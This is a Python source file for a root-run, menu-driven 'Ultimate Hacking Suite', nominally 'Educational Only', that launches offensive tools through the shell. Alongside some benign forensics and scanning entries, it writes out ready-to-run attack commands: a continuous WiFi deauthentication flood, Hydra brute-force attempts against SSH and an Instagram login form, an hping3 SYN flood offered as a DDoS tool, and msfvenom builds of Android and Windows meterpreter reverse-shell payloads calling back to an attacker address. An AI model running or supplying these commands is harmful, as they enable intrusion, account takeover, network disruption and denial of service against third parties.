import subprocess
import os
import sys

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def run_tool(tool_cmd):
    try:
        subprocess.run(tool_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running '{tool_cmd}': {e}")
        input("Press Enter to continue...")
    except FileNotFoundError:
        print(f"Tool '{tool_cmd}' not found. Install it first (e.g., sudo apt install {tool_cmd.split()[0]}).")
        input("Press Enter to continue...")

def network_scanning():
    clear_screen()
    print("=== NETWORK SCANNING ===")
    print("1. Nmap (Port scanning)")
    print("2. Wireshark (Packet analysis)")
    print("3. Host to IP (Info gathering)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('nmap -sV -O localhost')  # Example; customize
    elif choice == '2': run_tool('wireshark')
    elif choice == '3': run_tool('host google.com')

def vulnerability_scanning():
    clear_screen()
    print("=== VULNERABILITY SCANNING ===")
    print("1. OpenVAS (Full vuln scan)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('openvas-start')

def exploitation():
    clear_screen()
    print("=== EXPLOITATION ===")
    print("1. Metasploit (msfconsole)")
    print("2. Exploit Framework (search modules)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('msfconsole')
    elif choice == '2': run_tool('msfconsole -q -x "search eternalblue"')  # Example search

def wifi_hacking():
    clear_screen()
    print("=== WIFI HACKING ===")
    print("1. Aircrack-ng (Crack WPA)")
    print("2. WiFi Jammer")
    print("3. Wifi Deauthenticate")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('aircrack-ng')
    elif choice == '2': run_tool('aireplay-ng --deauth 0 -a <BSSID> wlan0mon')  # Customize
    elif choice == '3': run_tool('aireplay-ng --deauth 100 -a <BSSID> wlan0mon')

def web_app_testing():
    clear_screen()
    print("=== WEB APP TESTING ===")
    print("1. SQLMap (SQL Injection)")
    print("2. XSS Attack Tools")
    print("3. Web Crawling")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('sqlmap -u "http://target.com" --batch')
    elif choice == '2': run_tool('xsstrike -u "http://target.com"')
    elif choice == '3': run_tool('wget --spider -r -l 2 http://target.com')

def password_cracking():
    clear_screen()
    print("=== PASSWORD CRACKING ===")
    print("1. John the Ripper")
    print("2. Hydra (Bruteforce)")
    print("3. Hash Cracking")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('john --help')
    elif choice == '2': run_tool('hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com')
    elif choice == '3': run_tool('hashcat -m 0 example.hash /usr/share/wordlists/rockyou.txt')

def social_engineering():
    clear_screen()
    print("=== SOCIAL ENGINEERING ===")
    print("1. SET (Phishing)")
    print("2. SocialMedia Bruteforce")
    print("3. SocialMedia Finder")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('setoolkit')
    elif choice == '2': run_tool('hydra -l user -P passlist instagram.com http-post-form "/login:username=^USER^&password=^PASS^"')
    elif choice == '3': run_tool('sherlock username')

def steganography():
    clear_screen()
    print("=== STEGANOGRAPHY ===")
    print("1. Steghide (Hide/Extract)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('steghide')

def forensics():
    clear_screen()
    print("=== FORENSICS ===")
    print("1. Autopsy")
    print("2. Volatility (Memory analysis)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('autopsy')
    elif choice == '2': run_tool('volatility -f memdump.raw imageinfo')

def anonymity():
    clear_screen()
    print("=== ANONYMITY & HIDING ===")
    print("1. Tor (Proxy)")
    print("2. Proxychains")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('tor')
    elif choice == '2': run_tool('proxychains nmap target.com')

def info_gathering():
    clear_screen()
    print("=== INFO GATHERING ===")
    print("1. Wordlist Generator")
    print("2. Email Verify")
    print("3. IDN Homograph Attack")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('crunch 8 8 abcdef -o wordlist.txt')
    elif choice == '2': run_tool('email-verifier email@example.com')
    elif choice == '3': print("Manual: Use punycode converters for phishing domains.")

def advanced_tools():
    clear_screen()
    print("=== ADVANCED & MISC ===")
    print("1. DDOS Tools")
    print("2. RAT (Remote Admin)")
    print("3. Android Hacking")
    print("4. Payload Injector")
    print("5. Post Exploitation")
    print("6. Reverse Engineering")
    print("7. Terminal Multiplexer (tmux)")
    choice = input("Enter choice (or 'b' for back): ")
    if choice == '1': run_tool('hping3 --flood -S target.com')
    elif choice == '2': run_tool('msfvenom -p android/meterpreter/reverse_tcp LHOST=your.ip LPORT=4444 -o payload.apk')
    elif choice == '3': run_tool('adb devices')
    elif choice == '4': run_tool('msfvenom -p windows/meterpreter/reverse_tcp LHOST=your.ip -f exe > payload.exe')
    elif choice == '5': run_tool('msfconsole -q -x "use post/multi/manage/shell_to_meterpreter"')
    elif choice == '6': run_tool('ghidra')  # Or radare2: r2
    elif choice == '7': run_tool('tmux')

def main_menu():
    while True:
        clear_screen()
        print("=== ULTIMATE HACKING SUITE v1.0 ===")
        print("Based on HackingToolkit | Educational Only")
        print("1. Network Scanning")
        print("2. Vulnerability Scanning")
        print("3. Exploitation")
        print("4. WiFi Hacking")
        print("5. Web App Testing")
        print("6. Password Cracking")
        print("7. Social Engineering")
        print("8. Steganography")
        print("9. Forensics")
        print("10. Anonymity & Hiding")
        print("11. Info Gathering")
        print("12. Advanced & Misc Tools")
        print("0. Exit")

        choice = input("Enter choice: ").strip()

        if choice == '1': network_scanning()
        elif choice == '2': vulnerability_scanning()
        elif choice == '3': exploitation()
        elif choice == '4': wifi_hacking()
        elif choice == '5': web_app_testing()
        elif choice == '6': password_cracking()
        elif choice == '7': social_engineering()
        elif choice == '8': steganography()
        elif choice == '9': forensics()
        elif choice == '10': anonymity()
        elif choice == '11': info_gathering()
        elif choice == '12': advanced_tools()
        elif choice == '0': sys.exit(0)
        else:
            input("Invalid choice. Press Enter...")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root: sudo python3 main.py")
        sys.exit(1)
    main_menu()
